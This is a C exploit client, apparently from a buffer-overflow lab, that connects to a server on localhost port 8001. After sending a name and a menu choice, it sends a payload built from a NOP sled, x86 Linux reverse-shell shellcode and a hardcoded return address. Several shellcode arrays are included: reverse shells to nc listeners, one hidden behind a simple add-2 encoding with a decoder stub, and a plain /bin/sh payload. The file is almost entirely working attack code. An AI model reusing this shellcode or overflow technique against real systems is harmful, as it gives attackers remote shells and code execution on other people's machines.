/* A client */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	256
#define	ALENGTH	128

#define OFFSET 137

// reverse shell (nc -v -l 127.0.0.1 12345) INVALID
char shellcode1[]=
	"\x31\xdb\xf7\xe3\xfe\xc3\xb0\x66"
	"\x99\x52\x6a\x01\x6a\x02\x89\xe1"
	"\xcd\x80\x96\x6a\x66\x58\x43\xbf"
	"\x80\xff\xff\xfe\xf7\xd7\x57\x66"
	"\x68\x30\x39\x66\x53\x89\xe1\x6a"
	"\x10\x51\x56\x89\xe1\x43\xcd\x80"
	"\x87\xde\x6a\x02\x59\xb0\x3f\xcd"
	"\x80\x49\x79\xf9\xb0\x0b\x52\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x89\xe2\x53\x89"
	"\xe1\xcd\x80";

// simple shell VALID BUT USELESS
char shellcode2[] = 
"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68";

// reverse shell (nc localhost 4242) VALID
char shellcode[] = 
  // decoder with a sub 2
  "\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x6c\x0e\xff\x02\x80\xe9\x01\x75"
  "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
  // encoded payload with an add 2
  "\xed\x2c\x60\x33\xc2\x8a\x48\x09\x8a\x48\x11\x8a\x48\x1b\x8b\x78"
  "\x1c\x8f\x60\x0a\x8b\x60\x20\x8f\x60\x12\x8b\x60\x24\x8b\x48\x28"
  "\xb2\x0d\x8b\xf5\x8f\x50\x1c\x8f\x58\x28\xcf\x82\xea\xd3\x01\x01"
  "\x01\x31\x64\x6b\x70\x31\x70\x65\x32\x2f\x6e\x72\x36\x34\x36\x34"
  "\x32\x2f\x67\x31\x64\x6b\x70\x31\x75\x6a\x32\x45\x43\x38\x36\x39"
  "\x61\x47\x4e\x4b\x56\x47\x61\x56\x47\x43\x4f";
  
 
// reverse shell (nc -v -l 127.0.0.1 1234) INVALID
char shellcode3[]=
"\x31\xdb\xf7\xe3\xfe\xc3\xb0\x66\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\xbf\x80\xff\xff\xfe\xf7\xd7\x57\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";



loop(int s)
{
  char buffer[BLENGTH];
  char name[ALENGTH] = "Jimmy";
  
  /* Send name to server */
  send(s, name, ALENGTH, 0);

  for (;;) {

    /* Receive prompt */
    if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
      break;
    }	
    int i;

      
    
    /* Simulate the fact the user type 1 */
    strncpy(buffer, "1\n", sizeof(buffer)-1);
    buffer[sizeof(buffer)-1] = '\0';
    
    

	/* send user response */
    send(s, (void *)buffer, BLENGTH, 0); 
    
    
    for(i = 0 ; i < OFFSET ; i++ ) {
    buffer[i] = 0x90;
   }
    
    /* Put exploit code at start of buffer */
   memcpy(buffer+10, shellcode, strlen(shellcode));
    
    //put return address at end of buffer /
   memcpy(buffer+OFFSET-5, "\xd8\x32\xdc\xb7", 4); // 0xb7dc32d8
	

    /* Send user response */
    send(s, (void *)buffer, BLENGTH, 0);
  }
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
  close(s);

  return (0);
}
